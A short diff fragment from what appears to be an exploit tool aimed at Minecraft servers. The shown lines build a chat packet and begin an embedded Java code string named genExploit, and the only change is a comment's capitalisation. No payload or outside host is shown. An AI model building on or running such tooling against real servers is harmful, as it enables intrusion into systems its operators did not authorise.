@@ -20,7 +20,7 @@ class Exploit:
 
         packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
 
-        genExploit = (  #: Java code to run
+        genExploit = (  #: java code to run
                          """
         import java.io.IOException;
         import java.io.InputStream;
